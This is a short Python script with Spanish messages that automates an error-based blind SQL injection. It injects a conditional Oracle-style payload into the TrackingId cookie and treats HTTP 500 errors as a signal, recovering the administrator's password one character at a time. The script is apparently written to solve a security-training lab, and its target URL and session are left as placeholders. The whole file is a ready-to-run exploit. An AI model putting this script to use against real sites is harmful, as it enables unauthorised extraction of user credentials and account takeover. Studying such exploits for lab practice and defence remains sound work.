#!/usr/bin/env python3

from pwn import *
import requests, sys, signal, string
import time

def def_handler(sig, frame):
    print(f"\n[!] Saliendo...\n")
    p1.failure("Ataque de fuerza bruta detenido")
    sys.exit(1)

signal.signal(signal.SIGINT, def_handler)


p1 = log.progress("SQLi")

characters = string.ascii_lowercase + string.digits


def makeSQLi():

    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range (1, 21):
        for character in characters:
            cookies = {
                    'TrackingId': f"SB3RVC2QjsIChXzV'||(select case when substr(password,{position},1)='{character}' then to_char(1/0) else '' end from users where username='administrator')||'",
                    'session': "<Añadir_valor_de_session>"
            }

            p1.status(cookies["TrackingId"])

            r = requests.get("<Añadir_URL>", cookies=cookies)

            if r.status_code == 500:
                password += character
                p2.status(password)
                break

if __name__ == '__main__':
    makeSQLi()
